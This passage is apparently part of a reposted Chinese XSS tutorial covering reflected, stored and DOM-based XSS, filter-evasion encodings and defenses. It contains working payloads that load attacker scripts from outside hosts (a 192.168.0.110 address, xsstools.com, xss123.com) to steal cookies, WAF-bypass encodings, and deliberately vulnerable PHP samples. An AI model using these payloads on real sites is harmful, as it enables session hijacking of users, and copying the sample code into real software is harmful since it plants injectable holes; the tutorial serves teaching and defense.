src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675476994371-21.jpeg" alt="图片"></p><p>看到浏览器加载了，我们的xss恶意代码；</p><p>4）成功获取到了cookie信息</p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675477005771-24.jpeg" alt="图片"></p><p>5）图片创建链接</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;img src=''onerror=document.body.appendChild(document.createElement('script')).src='//192.168.0.110/xss.js'><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>6）字符拼接</p><p>这种一般是输入的字符有限制的时候使用</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>z<span class="token operator">=</span><span class="token string">'document.'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>z<span class="token operator">=</span>z<span class="token operator">+</span><span class="token string">'write("'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>z<span class="token operator">=</span>z<span class="token operator">+</span><span class="token string">'&lt;script'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>z<span class="token operator">=</span>z<span class="token operator">+</span><span class="token string">' src=ht'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>z<span class="token operator">=</span>z<span class="token operator">+</span><span class="token string">'tp://www.'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>z<span class="token operator">=</span>z<span class="token operator">+</span><span class="token string">'xsstools'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>z<span class="token operator">=</span>z<span class="token operator">+</span><span class="token string">'.com/a'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>z<span class="token operator">=</span>z<span class="token operator">+</span><span class="token string">'mER>&lt;/sc'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>z<span class="token operator">=</span>z<span class="token operator">+</span><span class="token string">'ript>")'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">eval</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>有的情况要用<span class="token comment">/**/</span>注释不需要的代码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7）jQuery加载</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>$<span class="token punctuation">.</span><span class="token function">getScript</span><span class="token punctuation">(</span><span class="token string">"//www.xsstools.com/amER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7-2、反射型XSS："><a href="#7-2、反射型XSS：" class="headerlink" title="7.2、反射型XSS："></a>7.2、反射型XSS：</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">//前端 1.html：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>反射型XSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span> //后端 action.php：<span class="token prolog">&lt;?php    $name=$_POST["name"];   echo $name;?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们接着在输入框输入:<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675477120753-27.jpeg" alt="图片"></p><p>页面直接弹出了xss的页面，可以看到， 我们插入的语句已经被页面给执行了，这就是最基本的反射型XSS漏洞，这种漏洞流向：前端–&gt;后端–&gt;前端</p><h3 id="7-3、存储型XSS："><a href="#7-3、存储型XSS：" class="headerlink" title="7.3、存储型XSS："></a>7.3、存储型XSS：</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">//前端：2.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>存储型XSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action2.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        输入你的ID：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        输入你的Name：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>//后端：action2.php<span class="token prolog">&lt;?php  $id=$_POST["id"];  $name=$_POST["name"];  mysql_connect("localhost","root","root");  mysql_select_db("test");  $sql="insert into xss value ($id,'$name')";  $result=mysql_query($sql);?></span>//供其他用户访问页面：show2.php<span class="token prolog">&lt;?php  mysql_connect("localhost","root","root");  mysql_select_db("test");  $sql="select * from xss where id=1";  $result=mysql_query($sql);  while($row=mysql_fetch_array($result))&#123;    echo $row['name'];  &#125;?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有一个用户提交页面，数据提交给后端之后，后端存储在数据库中，然后当其他用户访问另一个页面的时候，后端调出该数据，显示给另一个用户，XSS代码就被执行了；这里有一个用户提交页面，数据提交给后端之后，后端存储在数据库中，然后当其他用户访问另一个页面的时候，后端调出该数据，显示给另一个用户，XSS代码就被执行了；</p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675477178653-30.jpeg" alt="图片"></p><p>我们输入3和<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，接着，我们看看数据库；</p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675477192521-33.jpeg" alt="图片"></p><p>可以看到，我们的XSS语句已经插入到数据库中了；</p><p>然后当其他用户访问，show2.php页面的时候，我们插入的XSS代码就执行了；</p><p>存储型XSS的数据流向是：前端–&gt;后端–&gt;数据库–&gt;后端–&gt;前端</p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675477220532-36.jpeg" alt="图片"></p><h3 id="7-4、DOM型XSS"><a href="#7-4、DOM型XSS" class="headerlink" title="7.4、DOM型XSS"></a>7.4、DOM型XSS</h3><p>先放源代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">// 前端3.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>DOM型XSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action3.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>  // 后端action3.php  <span class="token prolog">&lt;?php  $name=$_POST["name"];?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?php echo $name; ?><span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>print<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">var</span> text<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> print<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"print"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  print<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span>text<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token comment">// 获取 text的值，并且输出在print内。这里是导致xss的主要原因。</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有一个提交页面，用户可以在此提交数据，数据提交之后，给后台处理；</p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675477255445-39.jpeg" alt="图片"></p><p>我们可以输入&lt;img src&#x3D;1 onerror&#x3D;alert(‘hack’)&gt;,然后看看页面的变化；</p><p>页面直接弹出了hack的页面，我们插入的语句已经被页面给执行了；</p><p>这就是DOM型XSS的漏洞，这种漏洞的数据流向是：前端–&gt;浏览器</p><h2 id="0x08、XSS编码绕过"><a href="#0x08、XSS编码绕过" class="headerlink" title="0x08、XSS编码绕过"></a>0x08、XSS编码绕过</h2><h3 id="8-1、gpc过滤字符"><a href="#8-1、gpc过滤字符" class="headerlink" title="8.1、gpc过滤字符"></a>8.1、gpc过滤字符</h3><p>如果gpc开启的时候，特殊字符会被加上斜杠即，’变成’，xss攻击代码不要用带单引号和双引号；</p><p>绕过gpc在php高版本gpc默认是没有的，但是开发程序员会使用addcslashes()对特殊字符进行转义；<br><code>&lt;script src=&#39;http://www.xss123.com/JGdbsl?1623638390&#39;&gt;&lt;/script&gt;</code>这个是执行不了的<br><code>&lt;script src=http://www.xss123.com/JGdbsl?1623638390&gt;&lt;/script&gt;</code>没有单引号可执行</p><h3 id="8-2、过滤alert"><a href="#8-2、过滤alert" class="headerlink" title="8.2、过滤alert"></a>8.2、过滤alert</h3><p>当页面过滤alert这个函数时，因为这个函数会弹窗，不仅很多程序会对他进行过滤，而且很多waf都会对其进行拦截，所以不存在alert即可；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">prompt</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script src<span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>xss123<span class="token punctuation">.</span>com<span class="token operator">/</span>eciAKJ<span class="token operator">?</span><span class="token number">1623635663</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="8-3、过滤标签"><a href="#8-3、过滤标签" class="headerlink" title="8.3、过滤标签"></a>8.3、过滤标签</h3><p>在程序里如果使用了html实体过滤，在php会使用htmlspecialchars()对输入的字符进行实体化，实体化之后的字符不会在html执行，把预定义的字符”&lt;”(小于)和”&gt;”(大于)转化为HTML实体，构造xss恶意代码大多数都必须使用&lt;或者&gt;，这两个字符被实体化之后，html里就不能执行了；</p><p>预定义的字符是：</p><p>&amp;(和号)成为&amp;amp</p><p>“(双引号)成为&amp;quot</p><p>’(单引号)成为&amp;#039</p><p>&lt;(小于)成为&amp;lt</p><p>&gt;(大于)成为&amp;gt</p><p>但是又在input这些标签里是不用考虑标签实体化，因为用不上&lt;&gt;这两个标签，</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token literal-property property">javascript</span><span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675477370166-42.jpeg" alt="图片"></p><h3 id="8-4、ascii编码"><a href="#8-4、ascii编码" class="headerlink" title="8.4、ascii编码"></a>8.4、ascii编码</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675477405993-45.jpeg" alt="图片"></p><h3 id="8-5、url编码"><a href="#8-5、url编码" class="headerlink" title="8.5、url编码"></a>8.5、url编码</h3><p><code>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;123&lt;/a&gt;</code></p><h3 id="8-6、JS编码"><a href="#8-6、JS编码" class="headerlink" title="8.6、JS编码"></a>8.6、JS编码</h3><p>编码直通车：<a href="https://www.jb51.net/tools/zhuanhuan.htm">https://www.jb51.net/tools/zhuanhuan.htm</a></p><p>八进制编码：<br><code>&lt;script&gt;eval(&quot;\141\154\145\162\164\50\61\51&quot;);&lt;/script&gt;</code></p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675477459098-48.jpeg" alt="图片"></p><p>16进制编码<br><code>&lt;script&gt;eval(&quot;\x61\x6c\x65\x72\x74\x28\x31\x29&quot;)&lt;/script&gt;</code></p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675477469855-51.jpeg" alt="图片"></p><p>jsunicode编码<br><code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#39;xss&#39;);&lt;/script&gt;</code></p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675477481764-54.jpeg" alt="图片"></p><h3 id="8-7、HTML编码"><a href="#8-7、HTML编码" class="headerlink" title="8.7、HTML编码"></a>8.7、HTML编码</h3><p>在&#x3D;后可以解析html编码</p><p>十进制：<br><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot; /&gt;</code><br><code>&lt;button onclick=&quot;confirm(&#39;7&#39;);&quot;&gt;Button&lt;/button&gt;</code></p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675477500976-57.jpeg" alt="图片"></p><p>十六进制</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">'<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6C<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x28<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x31<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x29<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">/></span></span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-8、base64编码"><a href="#8-8、base64编码" class="headerlink" title="8.8、base64编码"></a>8.8、base64编码</h3><p>使用伪协议base64解码执行xss</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="0x09、XSS的防御"><a href="#0x09、XSS的防御" class="headerlink" title="0x09、XSS的防御"></a>0x09、XSS的防御</h2><p>XSS防御的总体思路是：对用户的输入(和URL参数)进行过滤，对输出进行html编码，也就是对用户提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容，然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行；</p><p>对输入的内容进行过滤，可以分为黑名单和白名单过滤，黑名单过滤虽然可以拦截大部分的XSS攻击，但是还是存在被绕过的风险，白名单过滤虽然可以基本杜绝XSS攻击，但是真实环境中一般是不能进行如此严格的白名单过滤的；</p><p>对输出进行html编码，就是通过函数，将用户的输入的数据进行html编码，使其不能作为脚本运行；</p><p>如下是使用php中的htmlspecialchars函数对用户输入的name参数进行html编码，将其转化为html实体；</p><pre class="line-numbers language-none"><code class="language-none">#使用htmlspecialchars函数对用户输入的name参数进行html编码，将其转换为html实体$name &#x3D; htmlspecialchars( $_GET[ &#39;name&#39; ] );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们还可以服务端设置会话Cookie的HTTP Only属性，这样客户端的JS脚本就不能获取Cookie信息了；</p><h2 id="文章来源"><a href="#文章来源" class="headerlink" title="文章来源"></a>文章来源</h2><p><code>本文作者：wangkun05， 转载请注明来自FreeBuf.COM</code></p>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-Web渗透【手动漏洞挖掘】</title>
      <link href="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/"/>
      <url>/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/</url>
      
